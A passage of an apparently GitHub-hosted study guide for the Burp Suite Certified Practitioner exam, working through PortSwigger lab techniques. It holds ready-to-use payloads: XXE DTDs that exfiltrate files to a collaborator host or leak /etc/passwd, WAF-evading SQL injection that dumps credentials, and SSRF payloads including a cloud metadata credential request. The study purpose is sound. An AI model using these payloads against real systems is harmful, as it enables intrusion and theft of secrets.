%exfil;"><pre>&lt;!ENTITY % file SYSTEM "file:///home/carlos/secret"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY <span class="pl-c1">&amp;#x25;</span> exfil SYSTEM 'http://OASTIFY.COM/?x=%file;'&gt;"&gt;
%eval;
%exfil;</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/exploit.dtd.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/exploit.dtd.png" alt="Exploit.DTD file hosted" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Modify the file upload XML body of the request before sending to the target server.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE users [&lt;!ENTITY % xxe SYSTEM &quot;https://EXPLOIT.net/exploit.dtd&quot;&gt; %xxe;]&gt;
&lt;users&gt;
    &lt;user&gt;
        &lt;username&gt;Carl Toyota&lt;/username&gt;
        &lt;email&gt;carlos@hacked.net&lt;/email&gt;
    &lt;/user&gt;    
&lt;/users&gt;"><pre>&lt;?<span class="pl-ent">xml</span><span class="pl-e"> version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span><span class="pl-e"> encoding</span>=<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span>?&gt;
&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">users</span> [&lt;!<span class="pl-k">ENTITY</span> % <span class="pl-c1">xxe</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>https://EXPLOIT.net/exploit.dtd<span class="pl-pds">"</span></span>&gt; <span class="pl-c1">%xxe;</span>]&gt;
&lt;<span class="pl-ent">users</span>&gt;
    &lt;<span class="pl-ent">user</span>&gt;
        &lt;<span class="pl-ent">username</span>&gt;Carl Toyota&lt;/<span class="pl-ent">username</span>&gt;
        &lt;<span class="pl-ent">email</span>&gt;carlos@hacked.net&lt;/<span class="pl-ent">email</span>&gt;
    &lt;/<span class="pl-ent">user</span>&gt;    
&lt;/<span class="pl-ent">users</span>&gt;</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/blind-xxe-exploit-dtd.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/blind-xxe-exploit-dtd.png" alt="Exploiting blind XXE to exfiltrate data using a malicious exploit DTD file" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration" rel="nofollow">PortSwigger Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</a></p>
<blockquote>
<p dir="auto"><strong>Rabbit hole:</strong> The submit feedback and screenshot upload on feedback is not to be followed by <em><strong>Neo</strong></em> down the Matrix.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Identify Existing DTD Files</h3><a id="user-content-identify-existing-dtd-files" class="anchor" aria-label="Permalink: Identify Existing DTD Files" href="#identify-existing-dtd-files"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Reference list of existing DTD fileS on servers <a href="https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt">GoSecure dtd-finder dtd_files.txt</a></p>
</blockquote>
<p dir="auto">The following XML payload in POST body can be used to identify existing DTD files on target server:</p>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone='no'?&gt;
&lt;!DOCTYPE skippy [&lt;!ENTITY % peanuts SYSTEM &quot; PAYLOAD_POSITION &quot;&gt;%peanuts; ]&gt;
&lt;stockCheck&gt;
 &lt;productId&gt;
  1
 &lt;/productId&gt;
 &lt;storeId&gt;
  1
 &lt;/storeId&gt;
&lt;/stockCheck&gt;"><pre>&lt;?<span class="pl-ent">xml</span><span class="pl-e"> version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span><span class="pl-e"> encoding</span>=<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span><span class="pl-e"> standalone</span>=<span class="pl-s"><span class="pl-pds">'</span>no<span class="pl-pds">'</span></span>?&gt;
&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">skippy</span> [&lt;!<span class="pl-k">ENTITY</span> % <span class="pl-c1">peanuts</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span> PAYLOAD_POSITION <span class="pl-pds">"</span></span>&gt;<span class="pl-c1">%peanuts;</span> ]&gt;
&lt;<span class="pl-ent">stockCheck</span>&gt;
 &lt;<span class="pl-ent">productId</span>&gt;
  1
 &lt;/<span class="pl-ent">productId</span>&gt;
 &lt;<span class="pl-ent">storeId</span>&gt;
  1
 &lt;/<span class="pl-ent">storeId</span>&gt;
&lt;/<span class="pl-ent">stockCheck</span>&gt;</pre></div>
<blockquote>
<p dir="auto">Use Burp Intruder with above GoSecure wordlists to find valid DTD files that can be repurposed to <em><strong>Exploiting XXE to retrieve data exfil by repurposing a local DTD</strong></em></p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xml_identify_existing_dtd_files.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xml_identify_existing_dtd_files.png" alt="xml_identify_existing_dtd_files.png" style="max-width: 100%;"></a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">DTD Blind Error messages</h3><a id="user-content-dtd-blind-error-messages" class="anchor" aria-label="Permalink: DTD Blind Error messages" href="#dtd-blind-error-messages"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Trigger XML parsing errors in such a way that the error messages contain sensitive data.<br>
If the out of band to Collaborator payload above do not work test if the target will call a <code>exploit.dtd</code> file with invalid reference<br>
and return response in an error message.</p>
</blockquote>
<blockquote>
<p dir="auto">Hosted on exploit server the <code>/exploit.dtd</code> file and body contents to <code>file:///invalid/</code> path.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;&quot;&gt;
%eval;
%exfil;"><pre>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY <span class="pl-c1">&amp;#x25;</span> exfil SYSTEM 'file:///invalid/%file;'&gt;"&gt;
%eval;
%exfil;</pre></div>
<blockquote>
<p dir="auto">On the stock check XML post request insert the payload between definition and first element.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
  &lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://EXPLOIT.net/exploit.dtd&quot;&gt; %xxe;]&gt;
  &lt;stockCheck&gt;
    &lt;productId&gt;
	  1
	&lt;/productId&gt;
	&lt;storeId&gt;
	  1
	&lt;/storeId&gt;
&lt;/stockCheck&gt;"><pre>&lt;?<span class="pl-ent">xml</span><span class="pl-e"> version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span><span class="pl-e"> encoding</span>=<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span>?&gt;
  &lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">foo</span> [&lt;!<span class="pl-k">ENTITY</span> % <span class="pl-c1">xxe</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>https://EXPLOIT.net/exploit.dtd<span class="pl-pds">"</span></span>&gt; <span class="pl-c1">%xxe;</span>]&gt;
  &lt;<span class="pl-ent">stockCheck</span>&gt;
    &lt;<span class="pl-ent">productId</span>&gt;
	  1
	&lt;/<span class="pl-ent">productId</span>&gt;
	&lt;<span class="pl-ent">storeId</span>&gt;
	  1
	&lt;/<span class="pl-ent">storeId</span>&gt;
&lt;/<span class="pl-ent">stockCheck</span>&gt;</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dtd-exploit-invalid-error.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dtd-exploit-invalid-error.png" alt="DTD Exploit invalid error" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages" rel="nofollow">PortSwigger Lab: Exploiting blind XXE to retrieve data via error messages</a></p>
<blockquote>
<p dir="auto"><strong>Rabbit hole:</strong> The submit feedback and screenshot upload on feedback is for <em><strong>Neo</strong></em> to follow <em><strong>Trinity</strong></em> in the Matrix.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">SQL + XML + HackVertor</h3><a id="user-content-sql--xml--hackvertor" class="anchor" aria-label="Permalink: SQL + XML + HackVertor" href="#sql--xml--hackvertor"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">The combination of vulnerabilities are <em><strong>identified</strong></em> in a XML Post body and inserting mathematical expression such as <strong>7x7</strong> into field and observing the evaluated value. Using this type of XML and SQL injection with WAF filter bypass via encoding may allow extract of sensitive data.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-math-evaluated-xml.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-math-evaluated-xml.png" alt="identify-math-evaluated-xml" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">WAF detect attack when appending SQL query such as a UNION SELECT statement to the original store ID. Web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;storeId&gt;1 UNION SELECT NULL&lt;/storeId&gt;"><pre><span class="pl-k">&lt;</span>storeId<span class="pl-k">&gt;</span><span class="pl-c1">1</span> <span class="pl-k">UNION</span> <span class="pl-k">SELECT</span> <span class="pl-k">NULL</span><span class="pl-k">&lt;</span><span class="pl-k">/</span>storeId<span class="pl-k">&gt;</span></pre></div>
<blockquote>
<p dir="auto">Bypass the WAF, Use Burp extension <strong><a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100" rel="nofollow">Hackvertor</a></strong> to <a href="#obfuscation">obfuscate</a> the SQL Injection payload in the XML post body.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/hackvertor.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/hackvertor.png" alt="Web application firewall (WAF) bypass require obfuscate of malicious query with Hackvertor" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Webapp return one column, thus need to concatenate the returned usernames and passwords columns from the users table.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT username || '~' || password FROM users&lt;@/hex_entities&gt;&lt;/storeId&gt;"><pre>&lt;<span class="pl-ent">storeId</span>&gt;&lt;@hex_entities&gt;1 UNION SELECT username || '~' || password FROM users&lt;@/hex_entities&gt;&lt;/<span class="pl-ent">storeId</span>&gt;</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xml-sql-obfuscation.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xml-sql-obfuscation.png" alt="SQL injection with filter bypass via XML encoding obfuscation" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Below is sample SQLi payloads to read local file, or output to another folder on target.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;@hex_entities&gt;1 UNION all select load_file('/home/carlos/secret')&lt;@/hex_entities&gt;  

&lt;@hex_entities&gt;1 UNION all select load_file('/home/carlos/secret') into outfile '/tmp/secret'&lt;@/hex_entities&gt;"><pre><span class="pl-k">&lt;</span>@hex_entities<span class="pl-k">&gt;</span><span class="pl-c1">1</span> <span class="pl-k">UNION all</span> <span class="pl-k">select</span> load_file(<span class="pl-s"><span class="pl-pds">'</span>/home/carlos/secret<span class="pl-pds">'</span></span>)<span class="pl-k">&lt;</span>@<span class="pl-k">/</span>hex_entities<span class="pl-k">&gt;</span>  

<span class="pl-k">&lt;</span>@hex_entities<span class="pl-k">&gt;</span><span class="pl-c1">1</span> <span class="pl-k">UNION all</span> <span class="pl-k">select</span> load_file(<span class="pl-s"><span class="pl-pds">'</span>/home/carlos/secret<span class="pl-pds">'</span></span>) into outfile <span class="pl-s"><span class="pl-pds">'</span>/tmp/secret<span class="pl-pds">'</span></span><span class="pl-k">&lt;</span>@<span class="pl-k">/</span>hex_entities<span class="pl-k">&gt;</span></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding" rel="nofollow">PortSwigger Lab: SQL injection with filter bypass via XML encoding</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">SSRF - Server Side Request Forgery</h2><a id="user-content-ssrf---server-side-request-forgery" class="anchor" aria-label="Permalink: SSRF - Server Side Request Forgery" href="#ssrf---server-side-request-forgery"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#ssrf-blacklist-filter">SSRF blacklist filter</a><br>
<a href="#absolute-get-url--host-ssrf">SSRF via Absolute GET URL + HOST Header</a><br>
<a href="#xxe--ssrf">SSRF inside XXE</a><br>
<a href="#host-routing-based-ssrf">SSRF HOST Routing-based</a><br>
<a href="#html-to-pdf">SSRF inside HTML-to-PDF</a><br>
<a href="#ssrf-open-redirection">SSRF Open Redirection</a><br>
<a href="#host-connection-state">SSRF Consecutive Connection State</a></p>
<blockquote>
<p dir="auto">Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended malicious exploit location URL.</p>
</blockquote>
<blockquote>
<p dir="auto">SSRF attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data. Burp scanner may detect SSRF issue as an, <code>External service interaction (HTTP)</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">SSRF Sample payloads.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="/product/nextProduct?currentProductId=6&amp;path=https://EXPLOIT.net  

stockApi=http://localhost:6566/admin  

http://127.1:6566/admin  

Host: localhost"><pre>/product/nextProduct?currentProductId=6&amp;path=https://EXPLOIT.net  

stockApi=http://localhost:6566/admin  

http://127.1:6566/admin  

Host: localhost</pre></div>
<blockquote>
<p dir="auto">Alternative IP representation of <code>127.0.0.1</code>:</p>
</blockquote>
<ol dir="auto">
<li>2130706433</li>
<li>017700000001</li>
<li>127.1</li>
</ol>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">SSRF blacklist filter</h3><a id="user-content-ssrf-blacklist-filter" class="anchor" aria-label="Permalink: SSRF blacklist filter" href="#ssrf-blacklist-filter"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> the SSRF in the <code>stockAPI</code> parameter, and bypass the block by changing the URL target localhost and admin endpoint to: <code>http://127.1/%2561dmin</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">Double URL encode characters in URL to <strong>Obfuscate</strong> the <code>a</code> to <code>%2561</code>, resulting in the bypass of the blacklist filter.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf-obfuscated.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf-obfuscated.png" alt="ssrf obfuscated" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter" rel="nofollow">PortSwigger Lab: SSRF with blacklist-based input filter</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Absolute GET URL + HOST SSRF</h3><a id="user-content-absolute-get-url--host-ssrf" class="anchor" aria-label="Permalink: Absolute GET URL + HOST SSRF" href="#absolute-get-url--host-ssrf"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> SSRF flawed request parsing vulnerability by changing the <code>HOST</code> header to Collaborator server and providing an absolute URL in the GET request line and observe the response from the Collaborator server.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="GET https://TARGET.net/
Host: OASTIFY.COM"><pre>GET https://TARGET.net/
Host: OASTIFY.COM</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-ssrf-host.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-ssrf-host.png" alt="identify ssrf flawed request parsing host header" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Use the Host header to target 192.168.0.141 or <code>localhost</code>, and notice the response give 302 status admin interface found. Append /admin to the absolute URL in the request line and send the request. Observe SSRF response.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf.png" alt="ssrf" style="max-width: 100%;"></a></p>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="GET https://TARGET.net/admin/delete?csrf=cnHBVbOPl7Bptu3VCXQZh6MUYzMsEXgO&amp;username=carlos HTTP/1.1
Host: 192.168.0.114
Cookie: session=PQcb5CMC9ECh5fBobuxSalaBdxyLis01"><pre class="notranslate"><code>GET https://TARGET.net/admin/delete?csrf=cnHBVbOPl7Bptu3VCXQZh6MUYzMsEXgO&amp;username=carlos HTTP/1.1
Host: 192.168.0.114
Cookie: session=PQcb5CMC9ECh5fBobuxSalaBdxyLis01
</code></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing" rel="nofollow">PortSwigger Lab: SSRF via flawed request parsing</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">SSRF redirect_uris</h3><a id="user-content-ssrf-redirect_uris" class="anchor" aria-label="Permalink: SSRF redirect_uris" href="#ssrf-redirect_uris"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">In this Server Side Request a Redirect to URI is exploited.<br>
POST request to register data to the client application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary white-list of callback URIs. Observe the redirect_uri.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="POST /reg HTTP/1.1
Host: oauth-TARGET.web-security-academy.net
Content-Type: application/json
Content-Length: 206

{
&quot;redirect_uris&quot;:[&quot;https://example.com&quot;],
    &quot;logo_uri&quot; : &quot;https://OASTIFY.COM&quot;,
	&quot;logo_uri&quot; : &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/&quot;
	
}  "><pre>POST /reg HTTP/1.1
Host: oauth-TARGET.web-security-academy.net
Content-Type: application/json
Content-Length: 206

{
"redirect_uris":["https://example.com"],
    "logo_uri" : "https://OASTIFY.COM",
	"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
	
}  </pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf_redirect_uris.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf_redirect_uris.png" alt="ssrf_redirect_uris.png" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration" rel="nofollow">PortSwigger Lab: SSRF via OpenID dynamic client registration</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">XXE + SSRF</h3><a id="user-content-xxe--ssrf" class="anchor" aria-label="Permalink: XXE + SSRF" href="#xxe--ssrf"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Exploiting XXE to perform SSRF attacks using stock check function that obtains sensitive data.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
  &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;http://localhost:6566/latest/&quot;&gt; ]&gt;
  &lt;stockCheck&gt;
    &lt;productId&gt;
      &amp;xxe;
    &lt;/productId&gt;
    &lt;storeId&gt;
      1
    &lt;/storeId&gt;
  &lt;/stockCheck&gt;  "><pre>&lt;?<span class="pl-ent">xml</span><span class="pl-e"> version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span><span class="pl-e"> encoding</span>=<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span>?&gt;
